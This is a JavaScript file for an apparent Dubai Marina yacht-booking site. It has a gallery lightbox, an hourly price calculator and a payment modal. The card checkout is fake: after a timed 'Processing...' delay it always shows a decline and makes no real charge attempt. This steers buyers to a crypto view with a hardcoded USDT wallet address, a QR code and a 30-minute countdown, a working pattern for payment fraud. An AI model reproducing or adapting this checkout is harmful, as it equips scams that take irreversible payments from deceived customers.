const galleryImages = [
  'IMAGES/1-2-e1778574018286.jpg',
  'IMAGES/3-2.jpg',
  'IMAGES/4-2.jpg',
  'IMAGES/5-2.jpg',
  'IMAGES/6-2.jpg',
  'IMAGES/7-2.jpg',
  'IMAGES/7-2 (1).jpg',
  'IMAGES/8-2.jpg'
];

let currentImageIndex = 0;
let cryptoTimer = null;
const USDT_ADDRESS = 'TPBkTi6MJiUCr9Tshb3U3MY8Ebu1GH9hti';

function openLightbox(el) {
  const img = el.querySelector('img');
  const src = img.src;
  currentImageIndex = galleryImages.findIndex(path => src.includes(path));
  if (currentImageIndex === -1) currentImageIndex = 0;
  document.getElementById('lightbox-img').src = src;
  document.getElementById('lightbox').classList.add('active');
  document.body.style.overflow = 'hidden';
}

function closeLightbox() {
  document.getElementById('lightbox').classList.remove('active');
  document.body.style.overflow = '';
}

function prevImage() {
  currentImageIndex = (currentImageIndex - 1 + galleryImages.length) % galleryImages.length;
  document.getElementById('lightbox-img').src = galleryImages[currentImageIndex];
}

function nextImage() {
  currentImageIndex = (currentImageIndex + 1) % galleryImages.length;
  document.getElementById('lightbox-img').src = galleryImages[currentImageIndex];
}

document.addEventListener('keydown', (e) => {
  const lightbox = document.getElementById('lightbox');
  if (!lightbox.classList.contains('active')) return;
  if (e.key === 'Escape') closeLightbox();
  if (e.key === 'ArrowLeft') prevImage();
  if (e.key === 'ArrowRight') nextImage();
});

function copyAddress() {
  navigator.clipboard.writeText(USDT_ADDRESS);
  const btn = document.querySelector('.btn-copy');
  btn.textContent = 'Copied!';
  setTimeout(() => btn.textContent = 'Copy Address', 2000);
}

function showCardView() {
  document.getElementById('cardPaymentView').style.display = 'block';
  document.getElementById('cryptoPaymentView').style.display = 'none';
  document.getElementById('cardDeclinedView').style.display = 'none';
}

function showDeclinedView() {
  document.getElementById('cardPaymentView').style.display = 'none';
  document.getElementById('cryptoPaymentView').style.display = 'none';
  document.getElementById('cardDeclinedView').style.display = 'block';
}

function startCryptoTimer() {
  let totalSeconds = 30 * 60;
  const circumference = 2 * Math.PI * 45;

  if (cryptoTimer) clearInterval(cryptoTimer);

  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(USDT_ADDRESS)}&bgcolor=ffffff&color=0d1b2a`;
  document.getElementById('qrCode').src = qrUrl;

  cryptoTimer = setInterval(() => {
    totalSeconds--;
    if (totalSeconds <= 0) {
      clearInterval(cryptoTimer);
      document.getElementById('timerMinutes').textContent = '00';
      document.getElementById('timerSeconds').textContent = '00';
      document.getElementById('timerProgress').style.strokeDashoffset = circumference;
      return;
    }

    const mins = Math.floor(totalSeconds / 60);
    const secs = totalSeconds % 60;
    document.getElementById('timerMinutes').textContent = String(mins).padStart(2, '0');
    document.getElementById('timerSeconds').textContent = String(secs).padStart(2, '0');

    const progress = (totalSeconds / 1800) * circumference;
    document.getElementById('timerProgress').style.strokeDashoffset = circumference - progress;
  }, 1000);
}

document.addEventListener('DOMContentLoaded', () => {
  const header = document.getElementById('header');
  const hamburger = document.querySelector('.hamburger');
  const navLinks = document.querySelector('.nav-links');
  const bookingForm = document.getElementById('bookingForm');
  const modal = document.getElementById('paymentModal');
  const closeModal = document.querySelector('.close-modal');
  const hoursInput = document.getElementById('hours');
  const totalPriceEl = document.getElementById('totalPrice');
  const cardForm = document.getElementById('cardForm');
  const cardNumber = document.getElementById('cardNumber');
  const cardExpiry = document.getElementById('cardExpiry');
  const cardCvc = document.getElementById('cardCvc');

  const PRICE_PER_HOUR = 260;
  const hoursDisplay = document.getElementById('hoursDisplay');

  function updatePrice() {
    const hours = parseInt(hoursInput.value) || 1;
    const clamped = Math.min(Math.max(hours, 1), 24);
    hoursInput.value = clamped;
    const total = clamped * PRICE_PER_HOUR;
    totalPriceEl.textContent = '$' + total.toLocaleString();
    if (hoursDisplay) hoursDisplay.textContent = clamped;
  }

  window.changeHours = function(delta) {
    let current = parseInt(hoursInput.value) || 1;
    current += delta;
    if (current < 1) current = 1;
    if (current > 24) current = 24;
    hoursInput.value = current;
    updatePrice();
  };

  hoursInput.addEventListener('input', updatePrice);
  hoursInput.addEventListener('change', updatePrice);
  updatePrice();

  cardNumber.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, '').substring(0, 16);
    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
  });

  cardExpiry.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, '').substring(0, 4);
    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
    e.target.value = v;
  });

  cardCvc.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
  });

  window.addEventListener('scroll', () => {
    header.classList.toggle('scrolled', window.scrollY > 50);
  });

  hamburger.addEventListener('click', () => {
    navLinks.classList.toggle('active');
  });

  document.querySelectorAll('.nav-links a').forEach(link => {
    link.addEventListener('click', () => navLinks.classList.remove('active'));
  });

  closeModal.addEventListener('click', () => {
    modal.classList.remove('active');
    if (cryptoTimer) clearInterval(cryptoTimer);
    document.body.style.overflow = '';
  });

  modal.addEventListener('click', (e) => {
    if (e.target === modal) {
      modal.classList.remove('active');
      if (cryptoTimer) clearInterval(cryptoTimer);
      document.body.style.overflow = '';
    }
  });

  document.querySelectorAll('input[name="paymentMethod"]').forEach(radio => {
    radio.addEventListener('change', () => {
      if (radio.value === 'card') {
        showCardView();
      } else {
        document.getElementById('cardPaymentView').style.display = 'none';
        document.getElementById('cryptoPaymentView').style.display = 'block';
        document.getElementById('cardDeclinedView').style.display = 'none';
      }
    });
  });

  cardForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = cardForm.querySelector('.btn-pay');
    btn.textContent = 'Processing...';
    btn.disabled = true;

    await new Promise(r => setTimeout(r, 2500));

    showDeclinedView();
    btn.textContent = 'Pay Now';
    btn.disabled = false;
  });

  bookingForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const hours = parseInt(hoursInput.value) || 1;
    const guests = parseInt(document.getElementById('guests').value) || 1;
    const totalPrice = hours * PRICE_PER_HOUR;
    const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;

    document.getElementById('summaryAmount').textContent = '$' + totalPrice.toLocaleString();
    document.getElementById('summaryDesc').textContent = `${hours} hour(s) · ${guests} guest(s) · Dubai Marina`;
    document.getElementById('cryptoAmount').textContent = `${totalPrice} USDT`;

    if (paymentMethod === 'card') {
      showCardView();
    } else {
      document.getElementById('cardPaymentView').style.display = 'none';
      document.getElementById('cryptoPaymentView').style.display = 'block';
      document.getElementById('cardDeclinedView').style.display = 'none';
      startCryptoTimer();
    }

    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
  });

  const minDate = new Date().toISOString().split('T')[0];
  document.getElementById('date').setAttribute('min', minDate);
});
